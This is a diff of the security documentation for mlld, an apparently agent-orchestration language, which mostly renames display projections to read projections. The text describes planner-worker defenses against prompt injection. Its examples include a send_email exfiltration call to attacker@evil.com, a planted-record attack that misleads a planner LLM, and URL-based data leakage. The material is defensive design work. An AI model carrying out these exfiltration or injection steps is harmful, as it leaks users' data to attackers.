@@ -10,7 +10,7 @@ These principles describe how to use mlld's security model effectively. They app
 
 ### 1. Enforce structurally, don't exhort via prompts
 
-If your fix is "please use exact field names" or "please use only the referenced inputs," you don't have a fix — you have a wish. Prompt discipline drifts under normal conditions and fails entirely under adversarial ones. Use records with `=> record` coercion, typed worker parameters, handle-bearing control args, and display projections. Every constraint that can be moved from prompt to structure should be. When you catch yourself adding another "please" to a system prompt, look for the structural alternative.
+If your fix is "please use exact field names" or "please use only the referenced inputs," you don't have a fix — you have a wish. Prompt discipline drifts under normal conditions and fails entirely under adversarial ones. Use records with `=> record` coercion, typed worker parameters, handle-bearing control args, and read projections. Every constraint that can be moved from prompt to structure should be. When you catch yourself adding another "please" to a system prompt, look for the structural alternative.
 
 ### 2. Let the runtime own runtime contracts
 
@@ -18,7 +18,7 @@ If you're writing code that reads a tool's bound input record (its `facts:` / `d
 
 ### 3. Tool metadata is the single source of truth
 
-Bucketed intent, extraction contracts, `updateArgs` validation, display projections, authorization compilation — all derive from tool declarations. When you need a contract somewhere (planner prompts, extract schemas, validation checks), the answer is usually "read it from the tool metadata," not "restate it in a helper." Information that lives in two places will drift.
+Bucketed intent, extraction contracts, `updateArgs` validation, read projections, authorization compilation — all derive from tool declarations. When you need a contract somewhere (planner prompts, extract schemas, validation checks), the answer is usually "read it from the tool metadata," not "restate it in a helper." Information that lives in two places will drift.
 
 ### 4. Phases don't mix
 
@@ -30,22 +30,22 @@ Show the LLM only what it needs. Do this structurally, in two places:
 
 **At the worker's interface.** Resolve slot references into concrete typed parameters *before* calling the worker. A worker with `(slotState, request)` will drift no matter what the prompt says; a worker with `(target, inputs, request)` cannot access what it wasn't given.
 
-**At the record's boundary.** Use named display modes to serve different agent roles from the same record. The planner sees `{ref: "email"}` — value plus handle, structured for selection. The worker sees content but with facts masked. A context reader sees content with no handles at all. Same record, different visibility per audience:
+**At the record's boundary.** Use named read modes to serve different agent roles from the same record. The planner sees `{value: "email"}` — value plus handle, structured for selection. The worker sees content but with facts masked. A context reader sees content with no handles at all. Same record, different visibility per audience:
 
 ```mlld
 record @email = {
   facts: [from: string, message_id: string],
   data: [subject: string, body: string],
-  display: {
-    planner: [{ref: "from"}, {ref: "message_id"}, subject],
-    worker: [{mask: "from"}, subject, body]
+  read: {
+    role:planner: [{value: "from"}, {value: "message_id"}, subject],
+    role:worker: [{mask: "from"}, subject, body]
   }
 }
 ```
 
-Named display modes are a strict whitelist — unlisted fields are omitted entirely. The worker cannot accidentally see `message_id`. The planner cannot accidentally see `body`. Each role's visibility is enforced by the record definition, not by orchestration code that hopes to filter correctly.
+Named read modes are a strict value whitelist: unlisted fields are schema-visible protected, while {omit} hides existence entirely. The worker cannot accidentally see `message_id`. The planner cannot accidentally see `body`. Each role's visibility is enforced by the record definition, not by orchestration code that hopes to filter correctly.
 
-This is role-based access control built into the data layer. One record declares all the data once; named modes carve out per-role views; the runtime guarantees each agent sees only its contract. Orchestration code never has to mask fields or build role-specific views — the record does it structurally. When designing multi-agent systems, define the record with everything, then declare a display mode per agent role.
+This is role-based access control built into the data layer. One record declares all the data once; named modes carve out per-role views; the runtime guarantees each agent sees only its contract. Orchestration code never has to mask fields or build role-specific views — the record does it structurally. When designing multi-agent systems, define the record with everything, then declare a read mode per agent role.
 
 ### 6. Selection beats re-derivation
 
@@ -53,7 +53,7 @@ Preserve handle-bearing values in records. Let planners select from grounded can
 
 ### 7. Proof flows through values plus factsources, not handle strings
 
-Each fact-bearing value carries `factsources` metadata identifying its origin record, instance key, coercion id, and array position. That metadata travels with the value through assignment, parameter binding, shelf I/O, and the bridge — it is the durable cross-phase identity. Handles are per-call display labels the LLM uses to refer to fact-bearing values inside a single tool surface; each `@claude` invocation mints fresh handle strings via projection, and they are not portable across calls. Cross-phase identity flows through the underlying values plus their factsources via shelves and the `known` bucket — the runtime's proof claims registry is value-keyed, not handle-string-keyed, so a planner's `known` value matches a worker's freshly-minted handle for the same value automatically. Worker returns use the `handle` field type to enforce that fact-bearing values cross phase boundaries as projection-minted handles rather than as bare strings the LLM might fabricate. See `facts-and-handles` for the per-call ephemeral model. If your agent is copying preview strings around as authorization, you're inviting drift.
+Each fact-bearing value carries `factsources` metadata identifying its origin record, instance key, coercion id, and array position. That metadata travels with the value through assignment, parameter binding, shelf I/O, and the bridge — it is the durable cross-phase identity. Handles are per-call boundary labels the LLM uses to refer to fact-bearing values inside a single tool surface; each `@claude` invocation mints fresh handle strings via projection, and they are not portable across calls. Cross-phase identity flows through the underlying values plus their factsources via shelves and `known` values — the runtime's proof claims registry is value-keyed, not handle-string-keyed, so a planner's `known` value matches a worker's freshly-minted handle for the same value automatically. Shelf projection caches follow the same rule: they store handle-free role projection plans keyed by `.mx.key`, then mint fresh handles for the active LLM call at read time. Worker returns use the `handle` field type to enforce that fact-bearing values cross phase boundaries as projection-minted handles rather than as bare strings the LLM might fabricate. See `facts-and-handles` for the per-call ephemeral model. If your agent is copying preview strings around as authorization, you're inviting drift.
 
 ### 8. The right bucket for the right proof
 
@@ -576,7 +576,7 @@ show @send_email(["john@gmail.com"], "Report", @taintedBody)
 show @send_email(["attacker@evil.com"], "Exfil", @taintedBody)
 ```
 
-This pattern is the foundation of **planner-worker authorization** — a clean planning LLM determines what actions are authorized (using handles from display-projected tool results), and the runtime enforces those decisions regardless of what a tainted worker LLM tries to do. See the records/facts/handles section below for the full provenance model.
+This pattern is the foundation of **planner-worker authorization** — a clean planning LLM determines what actions are authorized (using handles from read-projected tool results), and the runtime enforces those decisions regardless of what a tainted worker LLM tries to do. See the records/facts/handles section below for the full provenance model.
 
 ### Example: Absolute constraint with locked policy
 
@@ -604,7 +604,7 @@ show @postToSlack(@apiKey)
 
 ## 5. The Capability Agent Pattern
 
-The recommended architecture for defended agents is a **persistent clean planner session with scoped framework workers**. The planner is one long-running `@claude` call. It calls framework-provided worker tools — `@rig.resolve`, `@rig.extract`, `@rig.execute`, `@rig.compose`, `@rig.advice` — each of which internally dispatches an isolated worker `@claude` call with a dedicated tool subset, display mode, shelf scope, and authorization scope.
+The recommended architecture for defended agents is a **persistent clean planner session with scoped framework workers**. The planner is one long-running `@claude` call. It calls framework-provided worker tools — `@rig.resolve`, `@rig.extract`, `@rig.execute`, `@rig.compose`, `@rig.advice` — each of which internally dispatches an isolated worker `@claude` call with a dedicated tool subset, read mode, shelf scope, and authorization scope.
 
 The planner stays clean throughout. It never sees tainted content directly. Workers do the tainted-content work and return planner-safe results through two structural boundary mechanisms only:
 
@@ -619,19 +619,19 @@ See `~/mlld/rig/plan-rig-refactor.md` for the full refactor plan and `~/mlld/mll
 
 Two structural mechanisms, not prompt discipline:
 
-1. **`role:planner` display projection.** The planner exe carries a `role:planner` label (see `spec-display-labels-and-handle-accessors.md`). Records project their `display: { role:planner: [...] }` whitelists at the LLM bridge. Tainted data fields are omitted. Fact fields get handles. The planner sees metadata + handles, not content.
+1. **`role:planner` read projection.** The planner exe carries a `role:planner` label (see `spec-record-permissions-update.md`). Records project their `read: { role:planner: [...] }` whitelists at the LLM bridge. Unlisted data fields are protected. Fact fields get handles when the read mode requests them. The planner sees metadata + handles, not content.
 
 2. **`->` taint scoping.** Worker tools return `->` values whose taint follows the expression's own inputs, not the exe's ambient scope (see `spec-thin-arrow-llm-return.md` §"Taint semantics"). A `->` expression constructed from handles (opaque, no taint) and literals (no taint sources) is clean even when the worker internally processed tainted content. This is the structural guarantee — not "the prompt tells the worker to filter," but "the `->` expression's dependency graph determines taint."
 
-These compose: canonical record returns use mechanism 1 (display projection at the bridge). Explicit `->` attestation uses mechanism 2 (expression-level taint scoping). Both keep the planner uninfluenced when the developer uses the intended pattern.
+These compose: canonical record returns use mechanism 1 (read projection at the bridge). Explicit `->` attestation uses mechanism 2 (expression-level taint scoping). Both keep the planner uninfluenced when the developer uses the intended pattern.
 
 ### The five worker types
 
 Each worker is a framework-provided tool the planner calls. Each has its own narrow scope.
 
-**Resolve** — grounds entities and handles from planner-safe tool surfaces. Uses only `resolve:r` tools. Writes grounded records to planner-selected shelf slots. When the planner needs the grounded domain result, return it on the canonical record path — `=> @grounded as record @RecordType` or `=> @cast(@grounded, @RecordType)` — so the bridge applies the planner's `role:*` display projection. It is also acceptable to use `->` for a planner-facing envelope that intentionally differs from the canonical record return, for example `{ slot, count, contacts: @grounded, summary }`. The point is to differentiate the planner contract on purpose, not to bypass the normal record path casually.
+**Resolve** — grounds entities and handles from planner-safe tool surfaces. Uses only `resolve:r` tools. Writes grounded records to planner-selected shelf slots. When the planner needs the grounded domain result, return it on the canonical record path — `=> @grounded as record @RecordType` or `=> @cast(@grounded, @RecordType)` — so the bridge applies the planner's `role:*` read projection. It is also acceptable to use `->` for a planner-facing envelope that intentionally differs from the canonical record return, for example `{ slot, count, contacts: @grounded, summary }`. The point is to differentiate the planner contract on purpose, not to bypass the normal record path casually.
 
-**Extract** — reads tainted content from explicitly selected sources. Uses only `extract:r` tools. Source scope is framework-enforced via `sourceArgs` and `no-unknown-extraction-sources`. Output is contract-pinned via developer-supplied records using `@cast(@raw, @contract)` (see `spec-display-labels-and-handle-accessors.md` §3). Writes typed results to planner-selected extracted slots. When the planner needs the extracted structured result, return it canonically — `=> @extracted` if already coerced, or `=> @cast(@raw, @contract)` — so the planner sees the contract's `role:planner` projection. It is also acceptable to use `->` for a deliberately different planner envelope such as `{ slot, contract, status, result: @extracted }`. The rule is the same: use `->` when the planner-facing tool result is intentionally different.
+**Extract** — reads tainted content from explicitly selected sources. Uses only `extract:r` tools. Source scope is framework-enforced via `sourceArgs` and `no-unknown-extraction-sources`. Output is contract-pinned via developer-supplied records using `@cast(@raw, @contract)` (see `spec-record-permissions-update.md` §3). Writes typed results to planner-selected extracted slots. When the planner needs the extracted structured result, return it canonically — `=> @extracted` if already coerced, or `=> @cast(@raw, @contract)` — so the planner sees the contract's `role:planner` projection. It is also acceptable to use `->` for a deliberately different planner envelope such as `{ slot, contract, status, result: @extracted }`. The rule is the same: use `->` when the planner-facing tool result is intentionally different.
 
 The extract worker is also where proposal-style outputs belong: `*_payload` contracts for a single downstream write, or `*_proposal` contracts for multi-step tasks where the planner must review a worker-derived action proposal before authorizing execution.
 
@@ -647,9 +647,9 @@ One write per execute dispatch. Multi-step tasks are a planner-managed sequence 
 
 Two distinct return channels serve two distinct purposes:
 
-**`=> record`** is the **data-plane** path. More concretely: `=> @value as record @RecordType` and `=> @cast(@value, @RecordType)` turn on record-mediated return filtering for the tool result. When that return crosses to an LLM caller, the bridge applies the active `role:*` display projection. This is how read tools (search, list, metadata lookup) communicate domain results to the planner — the planner sees fact fields with handles, data fields are omitted or masked per the record's display declaration.
+**`=> record`** is the **data-plane** path. More concretely: `=> @value as record @RecordType` and `=> @cast(@value, @RecordType)` turn on record-mediated return filtering for the tool result. When that return crosses to an LLM caller, the bridge applies the active `role:*` read projection. This is how read tools (search, list, metadata lookup) communicate domain results to the planner — the planner sees fact fields with handles, data fields are omitted or masked per the record's read declaration.
 
-**`->`** is the **control-plane** path. It lets a worker return a deliberately authored planner-visible object that is NOT produced by record display projection. This is for agent-to-agent communication: a worker that processed tainted content and performed actions needs to tell the planner what happened. That communication cannot be the worker LLM's own words, and it should not be a disguised domain-data path. The worker exe's mlld code — not the worker LLM — builds the `->` value programmatically from planner-safe sources: handles, status literals, counts, slot names, next-step signals. The `->` expression is the orchestrator-authored message.
+**`->`** is the **control-plane** path. It lets a worker return a deliberately authored planner-visible object that is NOT produced by record read projection. This is for agent-to-agent communication: a worker that processed tainted content and performed actions needs to tell the planner what happened. That communication cannot be the worker LLM's own words, and it should not be a disguised domain-data path. The worker exe's mlld code — not the worker LLM — builds the `->` value programmatically from planner-safe sources: handles, status literals, counts, slot names, next-step signals. The `->` expression is the orchestrator-authored message.
 
 `->` is the sharp-tool path for explicitly authored safe returns. A `->` built from handles (opaque, no taint) and literals (no taint sources) gives the planner a clean control message. If the developer stuffs tainted content into `->`, they are bypassing the intended pattern and the runtime will preserve that taint via expression-level taint scoping (see `spec-thin-arrow-llm-return.md` §"Taint semantics").
 
@@ -682,11 +682,11 @@ policy @p = {
 
 - **`deny`** — no role can authorize these tools, ever.
 - **`can_authorize`** — which roles can authorize which tools. The framework checks this before calling `@policy.build`. Catalog entries can also declare `can_authorize: "role:planner" | false | [roles]`, which compiles additively into this field; policy wins on conflict.
-- The planner's `role:planner` label is its **immutable identity** (from the exe declaration). Display overrides do NOT affect authorization — `with { display: "role:worker" }` changes visibility, not who you are.
+- The planner's `role:planner` label is its **immutable identity** (from the exe declaration). Read overrides do NOT affect authorization — `with { read: "role:worker" }` changes visibility, not who you are.
 
 The planner sees `<authorization_notes>` — auto-injected docs for tools it can authorize, generated from the policy's `can_authorize` field. Describes each tool's signature and fact args (from the bound input record's `facts:`) so the planner can construct valid authorization intent. Separate from `<tool_notes>` (which describes callable tools).
 
-### Records use `role:*` display keys
+### Records use `role:*` read keys
 
 Records declare per-role field visibility using `role:*` keys that match the labels on exes:
 
@@ -694,14 +694,14 @@ Records declare per-role field visibility using `role:*` keys that match the lab
 record @email_msg = {
   facts: [from: string, message_id: string],
   data: [subject: string, body: string],
-  display: {
-    role:planner: [{ ref: "from" }, { ref: "message_id" }],
+  read: {
+    role:planner: [{ value: "from" }, { value: "message_id" }],
     role:worker: [{ mask: "from" }, subject, body]
   }
 }
 ```
 
-The record is the **single source of truth** for both data shape and access policy. The `role:planner` display omits subject and body (injection surfaces). The `role:worker` display shows content with identity masked. The runtime matches the active `role:*` label from the exe to the record's display key. One naming system, one place the mapping lives. See `spec-display-labels-and-handle-accessors.md` §1.
+The record is the **single source of truth** for both data shape and access policy. The `role:planner` read omits subject and body (injection surfaces). The `role:worker` read shows content with identity masked. The runtime matches the active `role:*` label from the exe to the record's read key. One naming system, one place the mapping lives. See `spec-record-permissions-update.md` §1.
 
 ### Handles are universal and opaque
 
@@ -709,7 +709,7 @@ Any value can have a handle — fact or data, trusted or untrusted. Handles are 
 
 The security model operates on the **resolved value**, not on whether a handle exists. A handle to a data field resolves to a value with `untrusted` and no `fact:*` — positive checks deny. A handle to a fact field resolves to a fact-bearing value — positive checks pass. Handle existence doesn't grant proof or strip taint.
 
-Workers use `.mx.handle` (one value → one handle) and `.mx.handles` (compound value → role-filtered projected form with handles for all visible fields) to construct clean `->` returns. `@mx.handles` (ambient) returns all handles in the current session scope. See `spec-display-labels-and-handle-accessors.md` §2.
+Workers use `.mx.handle` (one value → one handle) and `.mx.handles` (compound value → role-filtered projected form with handles for all visible fields) to construct clean `->` returns. `@mx.handles` (ambient) returns all handles in the current session scope. See `spec-record-permissions-update.md` §2.
 
 ### Typed state, not just conversation history
 
@@ -745,7 +745,7 @@ A record declares which fields are authoritative and which are just content:
 record @contact = {
   facts: [email: string, name: string, phone: string?],
   data: [notes: string?],
-  display: [name, { mask: "email" }],
+  read: [name, { mask: "email" }],
   when [
     internal => :internal
     * => :external
@@ -760,7 +760,7 @@ exe @searchContacts(query) = run cmd {
 - `facts` fields get `fact:` labels — the source is authoritative for these values
 - `data` fields don't — they're content that could contain anything
 - `when` assigns trust tiers from the data itself: `fact:internal:@contact.email` vs `fact:external:@contact.email`
-- `display` controls what the LLM sees (see below)
+- `read` controls what the LLM sees (see below)
 
 **Trust refinement:** When `=> record` coercion runs on an `untrusted`-labeled exe result, `untrusted` is cleared on fact fields and `data.trusted` fields, and preserved on `data.untrusted` fields. `data: [fields]` is sugar for `data: { untrusted: [fields] }` — safe by default.
 
@@ -778,27 +778,28 @@ Fact fields get proof AND taint cleared. Trusted data gets taint cleared but NO 
 
 **Taint scoping:** When the tool has a bound input record with `facts:` entries, `no-untrusted-destructive` and `no-untrusted-privileged` scope their taint checks to those fact args only. Tainted data args (body, title, description) are expected LLM-composed payload in the planner-worker model and are not checked. Without a bound input record, all args are checked. Override with `taintFacts: true` on the exe, invocation, or policy rule to force all-arg checking.
 
-### Display projections and handles
+### Read projections and handles
 
 LLMs destroy value identity — they consume structured data as text and produce new JSON. The provenance is lost at the boundary.
 
-`display` on a record controls what crosses the LLM boundary. Five modes:
+`read` on a record controls what crosses the LLM boundary. Five modes:
 
 | Mode | Syntax | LLM sees | Handle? |
 |---|---|---|---|
 | **Bare** | `name` | Full value | No |
-| **Ref** | `{ ref: "name" }` | Full value + handle | Yes |
+| **Value** | `{ value: "name" }` | Full value + handle | Yes |
 | **Masked** | `{ mask: "email" }` | Preview + handle | Yes |
 | **Handle** | `{ handle: "id" }` | Handle only | Yes |
-| **Omitted** | (not listed) | Nothing | No |
+| **Protected** | `{ protected: "name" }` or not listed | Schema only | No |
+| **Omitted** | `{ omit: "name" }` | Nothing | No |
 
-Use `ref` for fields the LLM needs to both see and reference in downstream tool calls:
+Use `value` for fields the LLM needs to both see and reference in downstream tool calls:
 
 ```mlld
 record @contact = {
   facts: [email: string, name: string],
   data: [notes: string?],
-  display: [name, { ref: "email" }]
+  read: [name, { value: "email" }]
 }
 ```
 
@@ -807,8 +808,7 @@ Tool result at the LLM boundary:
 ```json
 {
   "name": "Mark Davies",
-  "email": { "value": "mark@example.com", "handle": "h_a7x9k2" },
-  "notes": "Met at conference"
+  "email": { "value": "mark@example.com", "handle": "h_a7x9k2" }
 }
 ```
 
@@ -821,22 +821,22 @@ The LLM passes the handle in tool calls or authorization:
 
 Both forms work. The runtime resolves `h_a7x9k2` back to the original live value with `fact:external:@contact.email` still attached. **Handles are per-call ephemeral** — each `@claude` invocation mints fresh handle strings via projection, and they are not portable across calls. The bridge resolves handles only against its own per-call mint table; a handle string captured from a prior call will not resolve in a later one. Cross-phase identity flows through the underlying values plus their factsources, not through handle strings — the planner-built `known` bucket and `@policy.build` reconcile values via the value-keyed proof claims registry, and the worker's freshly-minted handles for the same underlying value resolve correctly because they all point to identical content with identical fact labels. See `facts-and-handles` for the per-call ephemeral model and `builtins-ambient-mx` for the `@mx.handles` introspection accessor.
 
-**Named display modes** let one record serve agents with different visibility needs:
+**Named read modes** let one record serve agents with different visibility needs:
 
 ```mlld
 record @email_msg = {
   facts: [from: string, message_id: string],
   data: [subject: string, body: string, needs_reply: boolean],
-  display: {
-    worker: [{ mask: "from" }, subject, body],
-    planner: [{ ref: "from" }, { ref: "message_id" }, needs_reply]
+  read: {
+    role:worker: [{ mask: "from" }, subject, body],
+    role:planner: [{ value: "from" }, { value: "message_id" }, needs_reply]
   }
 }
 ```
 
-Worker sees subject and body (its job), from is masked. Planner sees from and message_id as ref (readable + handle), sees needs_reply, doesn't see raw email content. Select the mode at box level (`box @worker with { display: "worker" } [...]`) or per LLM call (`@claude(@prompt, { tools: @readTools }) with { display: "worker" }`). Call-site overrides box-level. Overrides can only restrict.
+Worker sees subject and body (its job), from is masked. Planner sees from and message_id as value (readable + handle), sees needs_reply, and sees unlisted fields as protected schema-only fields. Select the mode at box level (`box  with { read: "role:worker" } [...]`) or per LLM call (`(, { tools:  }) with { read: "role:worker" }`). Call-site overrides box-level. Overrides can only restrict.
 
-In named modes, unlisted fields are omitted entirely (strict whitelist). Single-list display preserves backward compatibility.
+In named modes, unlisted fields are protected. Use `{ omit: "field" }` only when the field existence should be hidden.
 
 **Worker returns with `handle` field type** enforce handle-bearing cross-phase values:
 
@@ -849,7 +849,7 @@ record @reader_result = {
 
 The `handle` type requires a resolvable handle — plain strings fail validation. If the LLM returns a bare string instead of copying the handle, `=> record` validation fails and a guard can retry.
 
-If no `display` clause is present, all fields are visible to the LLM. Boundary resolution still applies — see the next subsection for the exact paths the runtime accepts.
+If no `read` declaration is present, fields are protected by default at the LLM boundary. Boundary resolution still applies — see the next subsection for the exact paths the runtime accepts.
 
 ### Handle resolution and the builder auto-upgrade
 
@@ -910,7 +910,7 @@ The planner structures its authorization output by proof source. Three top-level
 }
 ```
 
-- **`resolved`** — values whose proof comes from a prior tool result (the planner saw a fact-bearing record and is naming the value to use). Accepts handle strings minted in a prior call's display projection, OR fact-bearing values passed directly from orchestrator code (the runtime walks the value's `factsources` to mint a fresh handle for the dispatching call). Bare literals with no proof are rejected.
+- **`resolved`** — values whose proof comes from a prior tool result (the planner saw a fact-bearing record and is naming the value to use). Accepts handle strings minted in a prior call's read projection, OR fact-bearing values passed directly from orchestrator code (the runtime walks the value's `factsources` to mint a fresh handle for the dispatching call). Bare literals with no proof are rejected.
 - **`known`** — values the user explicitly provided in their task text. The runtime verifies the value appears in the task text via the `{ task: @query }` config to `@policy.build`. Optional `source` field for audit logging. Must come from uninfluenced sources only (the clean planner).
 - **`allow`** — tools the planner authorizes with no per-arg constraints. Object form `{ tool: true }`. Works for tools regardless of whether they declare an input record with `facts:` — the planner is taking responsibility for the authorization at the tool level instead of per-arg.
 
@@ -977,7 +977,7 @@ var tools @writeTools = {
 - `?` marks optional fields (`cc: array?`). Optional facts participate in proof checks only when present.
 - `handle` is a legal field type (`recipient: handle`) — requires a handle-bearing reference, rejects bare strings.
 
-Input records are **validation schemas** — they never mint labels. Coercing into one via `=> record @sendEmail_inputs` is rejected. A record with `display:` is output-directed; a record with input-only sections (`correlate:`, `key:` with input shape) is input-directed; a record with neither may be used in both directions.
+Input records are **validation schemas** — they never mint labels. Coercing into one via `=> record @sendEmail_inputs` is rejected. A record with `read:` is output-directed; a record with input-only sections (`correlate:`, `key:` with input shape) is input-directed; a record with neither may be used in both directions.
 
 ### Fact kinds and accepted proof
 
@@ -1055,6 +1055,8 @@ var tools @bankTools = {
 ```
 
 This is **structurally enforced at dispatch time** — not a prompt-level guideline. The runtime checks that every fact arg value's `factsources` provenance points to the same source record instance, matching by `instanceKey` (the record's `key:` field value) when available, or by `(coercionId, position)` for keyless records. Cross-record dispatches are denied with `Rule 'correlate-control-args': fact args on @<tool> must come from the same source record`. The check works on both orchestrator-side direct dispatches and LLM-bridge dispatched tool calls — there is no path that bypasses it.
+
+**Key forms.** `key:` accepts a single field (`key: id`), a composite (`key: [account_id, period]`), or `key: hash(...)` for content-derived identity when no natural key exists. Every record-coerced object exposes the resulting `.mx.key` (opaque identity) and `.mx.hash` (deterministic content fingerprint over the non-key fields). Shelf upsert/from/remove and display projection caches address rows by `.mx.key`; `.mx.hash` is the right primitive for change detection ("did this row's content shift since I last looked?").
 
 The canonical attack this defends: an attacker who controls one record (e.g., a planted "transaction to attacker@evil.com") tricks the planner into mixing that record's `recipient` with a legitimate record's `id`. Both individual values have fact proof, so single-arg checks like `no-send-to-unknown` pass. Without correlation, the dispatch goes through and updates the legitimate transaction with the attacker's recipient. With `correlate: true` on the input record, the comparator sees the cross-source mismatch and denies. See `policy-authorizations` for the full attack model and the re-fetch case (same logical record from separate calls is correctly allowed via `instanceKey` matching).
 
@@ -1197,7 +1199,7 @@ Use `with { policy: @p, replace: true }` as the explicit escape hatch when you w
 record @contact = {
   facts: [email: string, name: string],
   data: [notes: string?],
-  display: [name, { mask: "email" }]
+  read: [name, { mask: "email" }]
 }
 
 record @sendEmail_inputs = {
@@ -1236,7 +1238,7 @@ If injection tricks the agent into using `attacker@evil.com` — a value the run
 
 ### URL exfiltration defense
 
-HTTP GET is a covert write channel — data encoded in a URL is transmitted by the fetch itself. Display projections prevent this for masked facts (the LLM can't encode what it can't see). For bare-visible facts, `no-novel-urls` closes the channel:
+HTTP GET is a covert write channel — data encoded in a URL is transmitted by the fetch itself. Read projections prevent this for masked facts (the LLM can't encode what it can't see). For bare-visible facts, `no-novel-urls` closes the channel:
 
 ```mlld
 policy @p = {
@@ -1278,7 +1280,7 @@ shelf @outreach = {
 }
 ```
 
-Each slot is typed by a record. The record provides schema, grounding, and display. The shelf adds merge (upsert/append/replace), cross-slot constraints (`from`), and access control.
+Each slot is typed by a record. The record provides schema, grounding, and read projection. The shelf adds merge (field-merge upsert by `.mx.key`, append, or replace), cross-slot constraints (`from`), version metadata, and access control. Wildcard shelves create virtual `record_type[]` slots from a record set, tool collection `returns:` metadata, or bare `*`; bounded scopes can grant access with `@state.*`.
 
 **Grounding is stricter than tool calls.** Agent writes to fact fields require handle-bearing input only — masked previews and bare literals are rejected. Durable state gets durable references.
 
@@ -1319,11 +1321,11 @@ box @decider with {
 
 Use `as <alias>` only when you want a role-based name distinct from the declared slot name. The common case is "agent sees the slot under whatever name the developer chose."
 
-**Auto-provisioned `@shelve` tool.** When a box has writable shelf scope, the runtime auto-injects a synthetic `shelve` MCP tool into the LLM's tool surface alongside whatever tools the call already declared. The agent doesn't need `shelve` listed in the box's `tools:` config — presence of writable shelf scope is sufficient. The LLM calls `shelve` like any other MCP tool, addressing the slot by alias name. The MCP tool's input schema constrains `slot_alias` to an enum of the box's writable aliases — the LLM cannot write to a slot the box didn't expose. The runtime resolves the alias to the underlying slot ref and runs the normal write pipeline (handle resolution → schema validation → grounding check → merge → source labeling).
+**Auto-provisioned `@shelve` tool.** When a box has writable shelf scope, the runtime auto-injects a synthetic `shelve` MCP tool into the LLM's tool surface alongside whatever tools the call already declared. The agent doesn't need `shelve` listed in the box's `tools:` config — presence of writable shelf scope is sufficient. The LLM calls `shelve` like any other MCP tool, addressing the slot by alias name. The MCP tool's input schema constrains `slot_alias` to an enum of the box's writable aliases — the LLM cannot write to a slot the box didn't expose. The runtime resolves the alias to the underlying slot value and runs the normal write pipeline (handle resolution → schema validation → grounding check → merge → source labeling).
 
 **The dispatcher pattern** for moving data between phases:
 
-1. Orchestrator pre-reads upstream slot state via `@shelf.read(@agent.shelf[@ref.slot])` and passes the typed values into the next phase's prompt as variables
+1. Orchestrator pre-reads upstream slot state via `@shelf.read(@agent.shelf[@value.slot])` and passes the typed values into the next phase's prompt as variables
 2. Worker LLM reads its inputs from the prompt and acts on them
 3. If the worker needs to commit something to a slot, it calls the auto-provisioned `shelve` tool with the alias the box exposed
 4. After the box closes, the orchestrator reads the slot back via `@shelf.read` for downstream phases
@@ -1333,6 +1335,49 @@ The box's `read:` scope supports cross-slot `from` constraint enforcement (so a 
 **Trust model:** slots don't mint facts. `known` doesn't persist in slots. Writes are atomic. Authority comes from the original records and `=> record` coercion — the shelf preserves proof, it doesn't create it.
 
 Shelf I/O preserves the full structured proof carrier through round-trips: a value written to a slot and read back retains its labels, factsources (including `instanceKey`, `coercionId`, `position`), and source-record provenance. Cross-phase identity passed via shelves is durable end-to-end — a planner writes a fact-bearing target, the worker reads it, and the resolved value still carries the same factsources for downstream `correlate-control-args` and positive checks to consume.
+
+**Wildcard shelves.** Three forms cover the common "I don't want to enumerate every slot upfront" cases:
+
+```mlld
+>> Bounded by a record set — virtual record_type[] slot per accepted record
+var @records = { contact: @contact, draft: @draft }
+shelf @state from @records
+
+>> Bounded by a tool collection's returns: metadata
+var tools @resolveTools = {
+  search_contacts: { mlld: @searchContacts, returns: @contact }
+}
+shelf @plannerState from @resolveTools
+
+>> Bare wildcard — accepts any record type known when the slot is accessed
+shelf @scratch = *
+```
+
+`from @records` accepts an object whose values are record definitions and pre-creates virtual empty `record_type[]` slots (`@state.contact`, `@state.draft`). `from @resolveTools` accepts a tool collection; every tool in the collection must declare `returns: @record`, and the union of those records becomes the bound. Bare `*` accepts any record type known at access time.
+
+Box scopes use `@s.<record_type>` for a specific accepted type or `@s.*` to match all of them:
+
+```mlld
+box {
+  shelf: {
+    read: [@state.*],
+    write: [@state.*]
+  }
+} [...]
+```
+
+For bounded wildcards `@state.*` expands over the accepted virtual slots. For bare `*` shelves it grants future writes for record types known when the slot is accessed.
+
+Wildcard slots are written and read through the same `@shelf` API — there is no `shelf @x <- @value` syntax:
+
+```mlld
+@shelf.write(@state.contact, @contactValue)
+@shelf.read(@state.contact)
+```
+
+**Field-merge upsert.** All `record[]` slots (static and wildcard) merge by `.mx.key`: incoming non-null fields replace stored fields, incoming missing or null fields leave the stored field unchanged. Use the expanded form when you want append-only history: `log: { type: contact[], merge: "append" }`.
+
+**Versioning.** `@someShelf.mx.version` returns the shelf rollup version; `@someShelf.someSlot.mx.version` returns the per-slot version. Both increment on writes and are useful for cache invalidation in dispatcher loops.
 
 ---
 
@@ -1357,7 +1402,7 @@ var session @planner = {
 
 The declaration is a labeled var — peer with `var tools`. The RHS is a JSON-shaped object whose values are types: primitives (`string`, `number`, `boolean`, `object`, `array`), record references (`@recordName`), typed arrays (`@recordName[]`), and the optional suffix (`?`). The var binds to the schema; live instances are materialized per call.
 
-Records used as session slot types must be input-style — no `display:` or `when:` sections. Sessions are accumulators, not proof sources.
+Records used as session slot types must be input-style — no `read:` or `when:` sections. Sessions are accumulators, not proof sources.
 
 ### Attachment and seed
 
@@ -1516,7 +1561,7 @@ Runtime tracing makes these cause-and-effect chains visible. Enable it with `--t
 ```bash
 mlld run pipeline --trace effects                          >> shelf writes, guard decisions, auth checks
 mlld run pipeline --trace handle                           >> only handle lifecycle (handle.issued / .resolved / .resolve_failed / .released)
-mlld run pipeline --trace verbose                          >> adds handle lifecycle, LLM calls, record coercions, display projections
+mlld run pipeline --trace verbose                          >> adds handle lifecycle, LLM calls, record coercions, read projections
 mlld run pipeline --trace effects --trace-file tmp/trace.jsonl
 ```
 
@@ -1544,7 +1589,7 @@ jq 'select(.event == "shelf.stale_read")' tmp/trace.jsonl  >> writes that didn't
 |---|---|
 | `@mx.handles` | The handles currently issued in the active LLM bridge scope (handle string → value preview, labels, factsource, issuedAt) |
 | `@mx.llm.sessionId` | The current bridge session id, or null outside an LLM call |
-| `@mx.llm.display` | The active named display mode for this call |
+| `@mx.llm.read` | The active named read mode for this call |
 | `@mx.llm.resume` | Resume state object (`{ sessionId, provider, continuationOf, attempt }`) or null |
 | `@mx.shelf.writable` / `@mx.shelf.readable` | Slot alias metadata for the current box's shelf scope |
 | `@mx.policy.active` | Active policy descriptors for the current execution context |
@@ -1614,11 +1659,11 @@ Concrete examples of patterns to avoid:
